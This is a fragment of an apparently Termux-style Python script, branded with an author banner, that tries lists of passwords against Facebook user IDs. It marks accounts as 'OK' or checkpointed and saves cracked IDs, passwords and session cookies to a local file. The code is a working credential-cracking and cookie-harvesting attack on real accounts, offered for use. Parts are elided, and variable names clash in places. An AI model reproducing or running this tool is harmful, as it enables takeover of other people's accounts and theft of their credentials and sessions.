...
\033[1;33m┗━━┻━━━┻┛╋┗┻┛╋┗┻┛╋┗━┛\033[1;32m┗┛\033[1;36m┗┛┗━┻┛╋┗┻━━┛⠀⠀⠀⠀⠀
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 {A}➢{G1} ISHAN RAJ
...
def menu():
    ...
    if sex in ['1']:
        ...
        os.system('xdg-open https://www.facebook.com/ISHAN.OFFICIALS.KING.99');menu()
    elif sex in ['0']:
        sys.exit()
    else:
        menu()
...
def randm(ids,psd):
    ...
    sys.stdout.write(f'\r\r{M}[{G1}ISHAN{M}]-{M}[{G1}{loop}{M}]-{M}[{G1}OK{M}:{G1}{len(ok)}{M}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}ISHAN-𝐎𝐊💚{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/devil-ok.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S}ISHAN-𝐂𝐏💔{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
    ...
    try:
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}ISHAN-𝐎𝐊💚{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/devil-ok.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[{M}ISHAN-𝐂𝐏💔{A}]{M} {ids} {A}|{M} {pas}')
